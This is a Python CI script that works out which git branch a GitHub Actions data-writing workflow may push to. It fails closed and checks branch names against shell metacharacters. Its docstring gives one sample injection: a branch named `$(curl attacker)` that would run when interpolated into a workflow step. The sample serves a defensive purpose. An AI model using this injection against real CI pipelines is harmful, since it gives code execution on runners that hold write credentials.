#!/usr/bin/env python3
r"""
scripts/ci/resolve_commit_branch.py
===================================
WAVE 0.05. Resolves, from explicit GitHub Actions context alone, the ONE
branch a data-writing workflow is allowed to persist to -- so a
`workflow_dispatch` rehearsal on a feature branch can never push canonical
production data to the default branch.

THE DEFECT THIS CLOSES
----------------------
`clv-update.yml` invoked `scripts/ci/git_data_commit.py` with no `--branch`.
That argument defaults to `'main'` (git_data_commit.py:591) and the push is
`git push origin HEAD:<branch>` (git_data_commit.py:552), so EVERY run pushed
to `main` regardless of which ref it was dispatched from. Meanwhile
`actions/checkout@v4` with no `ref:` checks out `github.ref` -- the dispatched
branch. The result is the worst possible shape: compute on the feature branch,
publish to production.

That made the settlement chain untestable. There was no way to rehearse
clv-update.yml end to end without writing real settlement data to `main`,
which is a direct contributor to audit CR-2 shipping in the first place --
six nights of settlement were lost to a defect that a single safe rehearsal
would have caught.

WHY A MODULE AND NOT A ONE-LINE `--branch ${{ github.ref_name }}`
-----------------------------------------------------------------
Two reasons that one-liner is unsafe:

1. INJECTION. Git permits characters in branch names that a POSIX shell
   treats as syntax -- `$`, backtick, `;`, `&`, `|`, `(`, `)` are all legal
   in a ref (git's own rules forbid space, `~`, `^`, `:`, `?`, `*`, `[`,
   `\`, `..`, `@{`, a trailing `.lock`, and little else). A workflow that
   interpolates `${{ github.ref_name }}` directly into a `run:` body
   substitutes the raw name into the script BEFORE the shell parses it, so a
   branch named `$(curl attacker)` executes. This module is fed context
   through the environment instead, and independently constrains the name to
   a charset containing no shell metacharacter at all.

2. AMBIGUITY. `github.ref_name` is meaningful only when the ref is a branch
   and the event is one whose ref identifies the write target. A tag ref, an
   unrecognized event, or a `schedule` firing on something other than the
   default branch are all states where the correct target is genuinely
   unknown -- and "unknown" must fail, never silently fall back to `main`.
   Falling back to the default branch is exactly the bug being fixed.

RESOLUTION RULES
----------------
    schedule           -> the ref, which MUST equal the default branch.
                          GitHub only fires schedules on the default branch;
                          if that is ever not true, the state is ambiguous
                          and this fails rather than guessing.
    workflow_dispatch  -> the dispatched ref, whatever it is. Dispatching
                          from `main` writes to `main` (intentional
                          production use); dispatching from a feature branch
                          writes ONLY to that feature branch.
    push               -> the pushed ref.

Everything else fails closed. The resolved branch is always the ref the run
is actually executing on, so a run can only ever write where it came from.

USAGE (prints the branch on stdout, exits non-zero on any ambiguity)

    GITHUB_EVENT_NAME=workflow_dispatch \\
    GITHUB_REF_NAME=my-branch GITHUB_REF_TYPE=branch \\
    DEFAULT_BRANCH=main python3 scripts/ci/resolve_commit_branch.py
"""

import os
import re
import sys

# Events whose ref unambiguously identifies the intended write target.
# Deliberately a closed allow-list: a new trigger must be considered here
# before a workflow using this resolver can write anything.
SUPPORTED_EVENTS = ("schedule", "workflow_dispatch", "push")

# Strict subset of what git permits. Every shell metacharacter is excluded,
# so a resolved name is safe to interpolate into a command line even by a
# caller that forgets to quote it. Stricter than git is the safe direction.
_BRANCH_CHARS_RE = re.compile(r"^[A-Za-z0-9._/-]+$")


class BranchResolutionError(Exception):
    """Raised for every ambiguous or malformed state. Never falls back."""


def validate_branch_name(name, what="branch"):
    """
    Returns `name` unchanged if it is a branch name this module is willing to
    push to, else raises BranchResolutionError. Conservative on purpose: the
    cost of rejecting an exotic-but-legal name is a workflow that needs a
    rename; the cost of accepting a hostile one is arbitrary code execution
    on a runner holding `contents: write`.
    """
    if name is None or name == "":
        raise BranchResolutionError("%s is missing or empty" % what)
    if not _BRANCH_CHARS_RE.match(name):
        raise BranchResolutionError(
            "%s %r contains characters outside [A-Za-z0-9._/-]; refusing to "
            "use it as a push target" % (what, name))
    if name.startswith("-"):
        raise BranchResolutionError(
            "%s %r starts with '-' and would be parsed as a command-line "
            "option" % (what, name))
    if name.startswith("/") or name.endswith("/"):
        raise BranchResolutionError("%s %r has an empty path component" % (what, name))
    if ".." in name or "//" in name:
        raise BranchResolutionError("%s %r contains '..' or '//'" % (what, name))
    if name.endswith(".lock") or name.endswith("."):
        raise BranchResolutionError("%s %r is not a valid ref name" % (what, name))
    if name in ("HEAD", "@"):
        raise BranchResolutionError("%s %r is a reserved ref" % (what, name))
    return name


def resolve_target_branch(event_name, ref_name, ref_type, default_branch):
    """
    Pure. Returns the single branch this run may push to, or raises
    BranchResolutionError. No argument has a default and nothing is inferred:
    every input must be supplied by the caller from real GitHub context.
    """
    if not event_name:
        raise BranchResolutionError(
            "event name is missing -- cannot determine whether this run's ref "
            "identifies a write target")
    if event_name not in SUPPORTED_EVENTS:
        raise BranchResolutionError(
            "event %r is not one this resolver knows how to target "
            "(supported: %s); refusing to guess a branch"
            % (event_name, ", ".join(SUPPORTED_EVENTS)))

    # A tag ref has no branch to push back to, and an absent ref_type means
    # we are not looking at real Actions context.
    if ref_type != "branch":
        raise BranchResolutionError(
            "ref type is %r, not 'branch' -- there is no branch to persist to"
            % (ref_type or "<missing>",))

    validate_branch_name(ref_name, "ref name")
    validate_branch_name(default_branch, "default branch")

    if event_name == "schedule" and ref_name != default_branch:
        # GitHub fires schedules only on the default branch. If that
        # invariant is ever violated the state is genuinely ambiguous.
        raise BranchResolutionError(
            "scheduled run is on ref %r but the repository default branch is "
            "%r; a schedule is only expected to fire on the default branch, "
            "so this state is ambiguous" % (ref_name, default_branch))

    # The write target is always the ref the run is executing on. This is the
    # whole safety property: a run cannot write anywhere it did not come from.
    return ref_name


def main(argv=None):
    argv = sys.argv[1:] if argv is None else argv
    if argv:
        print("usage: resolve_commit_branch.py  (reads GitHub context from the "
              "environment; takes no arguments)", file=sys.stderr)
        return 2

    try:
        branch = resolve_target_branch(
            event_name=os.environ.get("GITHUB_EVENT_NAME"),
            ref_name=os.environ.get("GITHUB_REF_NAME"),
            ref_type=os.environ.get("GITHUB_REF_TYPE"),
            default_branch=os.environ.get("DEFAULT_BRANCH"),
        )
    except BranchResolutionError as exc:
        print("::error title=Unsafe commit target::%s" % exc, file=sys.stderr)
        print("Refusing to persist anything. This is fail-closed by design: "
              "falling back to the default branch is the exact defect Wave "
              "0.05 removes.", file=sys.stderr)
        return 1

    print(branch)
    return 0


if __name__ == "__main__":
    sys.exit(main())
